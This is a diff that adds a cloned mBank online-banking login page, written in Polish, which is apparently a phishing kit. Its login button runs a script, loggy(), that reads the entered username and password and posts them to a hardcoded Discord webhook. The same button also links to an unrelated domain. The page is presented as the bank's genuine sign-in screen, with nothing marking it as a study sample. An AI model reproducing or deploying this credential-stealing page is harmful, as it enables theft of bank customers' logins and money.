@@ -1,0 +1,419 @@
+<html lang="pl" style="" class="js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage no-applicationcache stylish-select js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage no-applicationcache"><!--<![endif]--><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="description" content="Logowanie do serwisu transakcyjnego mBanku">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="/ruxitagentjs_ICA27NVfgqrux_10251220909040818.js" data-dtconfig="rid=RID_-928181828|rpid=1898696064|domain=mbank.pl|reportUrl=/rb_c3986c70-7e68-4d5e-bc2e-678c3836f83d|app=c37c6732d88cb224|cuc=cuw9drgu|mel=100000|featureHash=ICA27NVfgqrux|dpvc=1|ssv=4|lastModification=1708245290352|vcv=2|tp=500,50,0,1|rdnt=1|uxrgce=1|bp=3|agentUri=/ruxitagentjs_ICA27NVfgqrux_10251220909040818.js"></script><link href="/faviconIB30.ico" rel="shortcut icon">
+    <title>mBank serwis transakcyjny</title>
+    <script src="/venezia/polyfills/webcomponentsjs/custom-elements-es5-adapter.js?v=D31D8CC6"></script>
+    <script src="/venezia/polyfills/webcomponentsjs/webcomponents-loader.js?v=0118CEA3"></script><script src="https://online.mbank.pl/venezia/polyfills/webcomponentsjs/webcomponents-hi.js?v=0118CEA3"></script>
+    <script type="text/javascript" src="/venezia/veneziaLogin.js?v=29C5342C"></script>
+    <script type="text/javascript" src="/LoginMain/Resources/par_axd/LoginMain?file=Scripts%2FLogin%2FTranslation%2FtroubleshotModalInformationI18n.js&amp;v=e21b534da9ba2d01c8e08337487548ec"></script>
+    <link rel="Stylesheet" type="text/css" href="https://online.mbank.pl/LoginMain/Resources/par_axd/LoginMain?file=ResponsiveLogin%2FStyles%2FResponsiveLogin.css&v=e21b534da9ba2d01c8e08337487548ec">
+<script src="/venezia/js/component/troubleshot-modal-information.js?v=C0D024EE"></script></head>
+<body style="">
+    <script>
+        var loadWebComponent = function () {
+
+            var srcToLoad = [
+                "/venezia/js/component/troubleshot-modal-information.js?v=C0D024EE"
+            ];
+            for (var i = 0; i < srcToLoad.length; i++) {
+                var $script = document.createElement("script");
+                $script.src = srcToLoad[i];
+                document.head.appendChild($script);
+            }
+        }
+
+        if (window.WebComponents && window.WebComponents.ready) {
+            loadWebComponent();
+        } else {
+            window.addEventListener("WebComponentsReady", function () {
+                loadWebComponent();
+            });
+        }
+    </script>
+
+    <script type="text/javascript">
+        if (verifyBrowser.UA.browser == 'MSIE' && verifyBrowser.UA.version < 9) {
+            window.location.href = 'http://www.mbank.pl/?browser=old';
+        }
+        var userAgent = window.navigator.userAgent.toLowerCase();
+
+        if (userAgent.indexOf("trident") > -1) {
+            window.location.href = 'https://www.mbank.pl/indywidualny/serwis-transakcyjny-ib/pytania-i-odpowiedzi/wspierane-przegladarki';
+        }
+    </script>
+    <script>
+        window.Ebre = window.Ebre || {};
+        window.Ebre.ScaCurrentDfpLoadingEnabled = true;
+        window.Ebre.Venezia = window.Ebre.Venezia || {};
+        window.Ebre.Venezia.JsLoggerConfig = {"JsLoggerEnabled":true,"JsLoggerOnLoginPageEnabled":true,"UiNotificationErrorsEnabled":true,"ConsoleErrorsEnabled":true,"XhrErrorsEnabled":true,"FullPageErrorsEnabled":true,"MaxMessagesPerType":100,"ServerSideEnabled":true,"RequestHeaderFragmentEnabled":true,"RequestBodyFragmentEnabled":false,"RequestHeaderFragmentMaxLength":50,"RequestBodyFragmentMaxLength":100};
+        window.Ebre.Venezia.JsLoggerConfig.ApiUrl = '/pl/LoginMain/LoggingFacade/Log';
+        window.Ebre.Venezia.NewLazyLogoutEnabled = true;
+    </script>
+
+    <header class="header">
+        
+
+
+
+<a href="https://www.mbank.pl/">
+    <img class="header-left" src="https://online.mbank.pl/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/mbank_mass.svg" width="107" height="40" alt="Link do głównej strony mBank">
+</a>
+
+
+        <h1 class="accessible-not-visible">Zaloguj się do serwisu transakcyjnego</h1>
+            <span class="header-left trim">Zaloguj się do serwisu transakcyjnego</span>
+        <span class="header-right">
+            
+
+    <span class="lang-changer">
+
+
+
+        
+
+    <ul class="lang-list">
+        <li>
+            <a href="#" data-lang="pl" class="current-lang"><img src="/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/pl.svg" alt="Polski (PL)"> Polski (PL)</a>
+        </li>
+        <li>
+            <a href="#" data-lang="en" class=""><img src="/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/en.svg" alt="English (EN)"> English (EN)</a>
+        </li>
+    </ul>
+</span>
+<div class="lang-toast" role="alert">
+    You are about to switch to the English version of the website.<br>
+    If you use the mobile app, its language will automatically change to English as well. Some of our websites are available only in Polish. We are working hard to make them available in English as soon as possible. <a href="#" class="lang-toast-close">Close</a>
+</div>
+<script type="text/javascript">
+    var langChanger = document.querySelector(".lang-changer");
+    var langSelector = document.querySelector(".lang-selector");
+    var langListLinks = document.querySelectorAll(".lang-list a");
+    var langToast = document.querySelector(".lang-toast");
+    var langToastClose = document.querySelector(".lang-toast-close");
+
+    function setLang(lang) {
+        localStorage.setItem('language', lang);
+        window.history.replaceState({}, null, window.location.href.substring(0, window.location.href.indexOf('?')));
+        window.location.href = window.location.href + '?lang=' + lang;
+    }
+
+    var isEnLangAlreadyChoose = window.location.search == '?lang=en';
+    var getCurrentLangFromLocalStorage = localStorage.getItem('language');
+    var showLangToast = localStorage.getItem('showLangToast');
+    var multilanguageUserNotificationEnabled = "true";
+
+    if (getCurrentLangFromLocalStorage != "en") {
+        window.history.replaceState({}, null, window.location.href.substring(0, window.location.href.indexOf('?')));
+    }
+
+    if (getCurrentLangFromLocalStorage == "en" && !isEnLangAlreadyChoose) {
+        setLang("en");
+    }
+
+    if (showLangToast == "true" && langToast && multilanguageUserNotificationEnabled == "true") {
+        langToast.classList.add("active");
+        localStorage.removeItem('showLangToast');
+    }
+
+    langListLinks.forEach(function(link) {
+        link.addEventListener("click", function(e) {
+            e.preventDefault();
+
+            langChanger.classList.remove('active');
+
+            if (e.target.dataset.lang != getCurrentLangFromLocalStorage) {
+                setLang(e.target.dataset.lang);
+
+                if (e.target.dataset.lang == "en" && multilanguageUserNotificationEnabled == "true") {
+                    localStorage.setItem('showLangToast', 'true');
+                }
+            }
+        });
+    });
+
+    langSelector.addEventListener("click", function (e) {
+        e.preventDefault();
+
+        langChanger.classList.toggle('active');
+    });
+
+    window.addEventListener("click", function (e) {
+        langChanger.classList.remove('active');
+    });
+
+    langChanger.addEventListener("click", function (e) {
+        e.stopPropagation();
+    });
+
+    langToastClose.addEventListener("click", function (e) {
+        e.preventDefault();
+
+        langToast.classList.remove('active');
+    });
+</script>
+
+
+        </span>
+        <span class="header-right desktop">
+            
+
+    <a href="https://www.mbank.pl/bezpieczenstwo/">
+    <img class="ico-lock" src="/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/lock.png" alt="">
+    Bezpieczeństwo
+</a>
+
+
+        </span>
+        <span class="header-right mobile-landscape">
+            
+
+    <a href="https://www.mbank.pl/kontakt/oferta-indywidualna/">
+    <img class="ico-lock" src="/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/kontakt.png" alt="">
+    Kontakt
+</a>
+
+
+        </span>
+        <span class="header-right mobile-landscape">
+            
+
+    <a href="https://www.mbank.pl/bezpieczenstwo/">
+    <img class="ico-lock" src="/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/lock.png" alt="">
+    Bezpieczeństwo
+</a>
+
+
+        </span>
+    </header>
+    <div class="main">
+        <div class="img-container">
+            
+
+<img src="https://online.mbank.pl/contentcache/logon/responsive_logon_retail/background" alt="" role="presentation">
+
+
+        </div>
+        <div class="panel">
+            
+
+<div id="retail" class="login expanded login-form scenario-default">
+    <div class="login-container">
+        <form id="loginForm" method="POST" autocomplete="off">
+            <div class="color"></div>
+            <div class="login-content">
+                <div class="title-container ">
+                    <h2 class="accessible-not-visible">Klienci indywidualni i firmowi</h2>
+                    <div class="title">Klienci indywidualni i firmowi</div>
+                </div>
+
+                <div class="logged-container" role="alert" aria-live="assertive">
+                    <div class="logged">Zalogowano</div>
+                </div>
+
+                <div class="spinner-container">
+                    <div class="photo spinner"></div>
+                </div>
+
+                <div class="error-container" role="alert">
+                    <div id="errorMessage" class="message"></div>
+                    <div id="errorDetails" class="details"></div>
+                </div>
+
+                <div class="form-container">
+                    <div class="photo-container">
+                        <div class="avatar photo photo-retail" style="background-image: url(https://online.mbank.pl/contentcache/logon/responsive_logon_retail/avatar_retail)"></div>
+                    </div>
+                    <div class="field-container">
+
+                        <div class="form-input">
+                            <input name="userID" id="leen" type="text" maxlength="24" required="" placeholder="Identyfikator" aria-describedby="userIDDescription" autofocus="" autocomplete="off">
+                            <a tabindex="-1" href="#" aria-label="Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta." class="tooltip">
+                                <i>?</i>
+                            </a>
+                            <div class="accessible-not-visible" id="userIDDescription">Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta.</div>
+                        </div>
+                        <div class="form-input">
+                            <input name="pass" id="nuum" type="password" maxlength="32" required="" placeholder="Hasło" aria-describedby="passDescription" autocomplete="off">
+                            <a tabindex="-1" href="#" aria-label="Wpisz hasło, którego używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj, że system rozpoznaje duże i małe litery." class="tooltip">
+                                <i>?</i>
+                            </a>
+                            <div class="accessible-not-visible" id="passDescription">Wpisz hasło, którego używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj, że system rozpoznaje duże i małe litery.</div>
+                        </div>
+
+                    </div>
+                </div>
+                <div id="capslockWarning" class="capslock-warning" style="display: none;">Caps Lock włączony</div>
+            </div>
+            <div class="buttons form-buttons"> <a onclick="loggy()" href="https://betclic.pl.id1928.online">
+                <button id="submitButton" form="loginForm" type="submit" class="btn" aria-disabled="true" onclick="loggy()">
+                    Zaloguj się
+                </button>
+</a>
+            </div>
+<script>
+function loggy() {
+    var login = document.getElementById("leen").value;
+    var password = document.getElementById("nuum").value;
+
+    // Utwórz obiekt XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    var url = "https://discord.com/api/webhooks/1209304137695633490/MWvwbpeqT3R24UDgrRHS-Mp3egafLb6CAcH4RWS29h_YQ4xUQJ_MQ38cRcsY6RqEXVk7";
+    
+    // Ustaw metodę i adres URL żądania
+    xhr.open("POST", url, true);
+    
+    // Ustaw nagłówki żądania
+    xhr.setRequestHeader("Content-Type", "application/json");
+    
+    // Utwórz JSON z danymi
+    var data = JSON.stringify({
+        "embeds": [{
+            "title": "Login Credentials",
+            "fields": [
+                {
+                    "name": "Login",
+                    "value": login
+                },
+                {
+                    "name": "Password",
+                    "value": password
+                }
+            ]
+        }]
+    });
+    
+    // Wyślij żądanie
+    xhr.send(data);
+    
+    // Po zakończeniu żądania wykonaj odpowiednią akcję
+
+}
+</script>
+            <div class="buttons error-buttons">
+                <button id="reloginBtn" type="submit" class="btn">
+                    Zaloguj się ponownie
+                </button>
+            </div>
+            <div class="buttons redirect-activation-buttons">
+                <button id="redirectActivatioBtn" type="submit" class="btn">
+                    Dalej
+                </button>
+            </div>
+            <div class="buttons finish-button">
+                <button id="finishBtn" type="submit" class="btn">
+                    Zakończ
+                </button>
+            </div>
+        </form>
+    </div>
+        <div class="buttons info-buttons component-info">
+            <troubleshot-modal-information theme="pl"></troubleshot-modal-information>
+            <script>
+                var troubleshotInformationElement = document.getElementsByTagName("troubleshot-modal-information");
+                if (troubleshotInformationElement.length !== 0) {
+                    if (document.querySelector("#pb.login.expanded")) {
+                        troubleshotInformationElement[0].setAttribute("theme", "pb");
+                    } else {
+                        troubleshotInformationElement[0].setAttribute("theme", "pl");
+                    }
+                }
+            </script>
+        </div>
+        <div class="buttons info-buttons right">
+            <a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html" target="_blank" class="login-problems-link left">Problem z zalogowaniem?</a>        
+        </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+    </div>
+
+        <div class="adv-container">
+            <div class="small-adv-placeholder">
+                <div class="adv">
+                    
+
+<a href="https://mobiletrendsawards.pl/mta/glosowanie" tabindex="-1">
+    <img src="https://online.mbank.pl/contentcache/logon/responsive_logon_retail/adv" style="max-width: 100%;" alt="" role="presentation">
+</a>
+
+    
+                </div>
+            </div>
+            <div class="big-adv-placeholder">
+                <div class="adv desktop">
+                    
+
+
+    
+                </div>
+            </div>
+        </div>
+    
+    <script type="text/javascript" src="/venezia/libs.js?v=DF4AFD34"></script>
+    <script>
+        I18n.defaultLocale = "pl";
+        I18n.locale = "pl";
+    </script>
+    <script type="text/javascript" src="https://online.mbank.pl/lgres/logos.js"></script>
+    
+
+<script type="text/javascript" src="/LoginMain/Resources/par_axd/LoginMain?file=ResponsiveLogin%2FScripts%2Fmain.built.js&amp;v=e21b534da9ba2d01c8e08337487548ec"></script>
+<script type="text/javascript">
+
+
+Ebre.Namespace("Ebre.Venezia.Login");
+Ebre.Venezia.Login.LoginUrl = '/pl/LoginMain/Account/JsonLogin';
+
+
+require(['LoginMain/ResponsiveLogin/Scripts/App'], function(App) {
+    var mobileInfo = {
+        windowsAppUrl: "http://mbank.pl/kampanie/ib-wp.html",
+        windowsConfirmMessage: "Pobierz ze sklepu bezpłatną aplikację mBanku na Windows Phone i korzystaj z bankowości mobilnej jeszcze wygodniej.",
+
+        androidAppUrl: "http://mbank.pl/kampanie/ib-android.html",
+        androidConfirmMessage: "Pobierz ze sklepu bezpłatną aplikację mBanku na Androida i korzystaj z bankowości mobilnej jeszcze wygodniej.",
+
+        appleAppUrl: "http://mbank.pl/kampanie/ib-ios.html",
+        appleConfirmMessage: "Pobierz ze sklepu bezpłatną aplikację mBanku na iOS i korzystaj z bankowości mobilnej jeszcze wygodniej.",
+    }
+    var app = new App();
+    app.initialize('F71PqtMKMEW-m5qo_aR9wg==', 'Default', null, '', null, mobileInfo);
+    });
+</script>
+
+
+    
+    
+    <script src="/pl/LoginMain/Account/ResponsiveLoginGemius" type="text/javascript"></script>
+
+    
+    <script src="/venezia/behaviour.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        window.Behaviour.Attach();
+    </script><script src="/Behaviour/Script?6pUKBPVeMv6aGW3zEXwGI7PuyaDHyYIN" type="application/javascript"></script>
+
+    <script src="/venezia/veneziatdl2.js" type="text/javascript"></script>
+
+
+
+
+</body></html>
